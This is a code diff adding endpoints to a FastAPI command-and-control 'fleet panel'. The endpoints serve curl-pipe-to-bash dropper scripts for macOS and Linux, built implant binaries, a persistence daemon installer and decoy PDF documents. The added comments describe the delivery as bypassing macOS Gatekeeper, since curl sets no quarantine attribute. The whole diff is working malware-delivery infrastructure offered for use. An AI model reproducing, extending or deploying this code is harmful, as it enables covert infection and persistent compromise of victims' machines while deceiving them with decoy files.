@@ -41,6 +41,8 @@ log = logging.getLogger("fleet.panel")
 
 CSRF_COOKIE = "fleet_csrf"
 
+REPO_ROOT = Path(__file__).resolve().parent.parent
+
 
 def _client_ip(request: Request) -> str:
     forwarded = request.headers.get("x-forwarded-for")
@@ -309,6 +311,108 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         url = f"https://{download_host}/e/{artifact['slug']}"
         return JSONResponse(
             {"url": url, "family": family, "profile": profile, "slug": artifact["slug"]},
+            headers={"Cache-Control": "no-store"},
+        )
+
+    # -- one-line installers (curl | bash) -----------------------------------
+    # Serves shell scripts that download + run the implant directly via curl,
+    # bypassing Gatekeeper entirely (curl sets no quarantine attribute;
+    # bash execution does not trigger Gatekeeper).
+    #
+    #   curl -sSL https://<panel>/install/mac  | bash   (macOS)
+    #   curl -sSL https://<panel>/install/linux | bash  (Linux)
+
+    def _latest_artifact(os_name: str) -> dict | None:
+        recent = run_in_threadpool(app.state.pipeline.recent, 300)
+        matches = [a for a in recent if str(a.get("os", "")) == os_name]
+        if not matches:
+            return None
+        return max(matches, key=lambda a: float(a.get("ts", 0)))
+
+    def _artifact_path(os_name: str) -> Path | None:
+        art = _latest_artifact(os_name)
+        if art is None:
+            return None
+        return Path(art["path"])
+
+    @app.get("/install/mac")
+    async def install_mac_script(request: Request) -> PlainTextResponse:
+        template = (REPO_ROOT / "droppers" / "mac" / "installer.sh.tmpl").read_text(
+            encoding="utf-8"
+        )
+        endpoint = str(request.base_url).rstrip("/")
+        source = template.replace("{{PANEL_ENDPOINT}}", endpoint)
+        return PlainTextResponse(
+            source,
+            media_type="text/x-shellscript",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/mac/binary")
+    async def install_mac_binary() -> FileResponse:
+        path = _artifact_path("darwin")
+        if path is None or not path.is_file():
+            raise HTTPException(status_code=404, detail="no macOS implant built yet")
+        return FileResponse(
+            path,
+            filename=path.name,
+            media_type="application/octet-stream",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/mac/daemon")
+    async def install_mac_daemon() -> PlainTextResponse:
+        daemon = REPO_ROOT / "droppers" / "mac" / "install-daemon.sh"
+        if not daemon.is_file():
+            raise HTTPException(status_code=404, detail="daemon installer not found")
+        return PlainTextResponse(
+            daemon.read_text(encoding="utf-8"),
+            media_type="text/x-shellscript",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/mac/decoy")
+    async def install_mac_decoy() -> Response:
+        from .build import minimal_pdf
+
+        return Response(
+            content=minimal_pdf(config.document_name),
+            media_type="application/pdf",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/linux")
+    async def install_linux_script(request: Request) -> PlainTextResponse:
+        template = (REPO_ROOT / "droppers" / "linux" / "installer.sh.tmpl").read_text(
+            encoding="utf-8"
+        )
+        endpoint = str(request.base_url).rstrip("/")
+        source = template.replace("{{PANEL_ENDPOINT}}", endpoint)
+        return PlainTextResponse(
+            source,
+            media_type="text/x-shellscript",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/linux/binary")
+    async def install_linux_binary() -> FileResponse:
+        path = _artifact_path("linux")
+        if path is None or not path.is_file():
+            raise HTTPException(status_code=404, detail="no Linux implant built yet")
+        return FileResponse(
+            path,
+            filename=path.name,
+            media_type="application/octet-stream",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/install/linux/decoy")
+    async def install_linux_decoy() -> Response:
+        from .build import minimal_pdf
+
+        return Response(
+            content=minimal_pdf(config.document_name),
+            media_type="application/pdf",
             headers={"Cache-Control": "no-store"},
         )
 
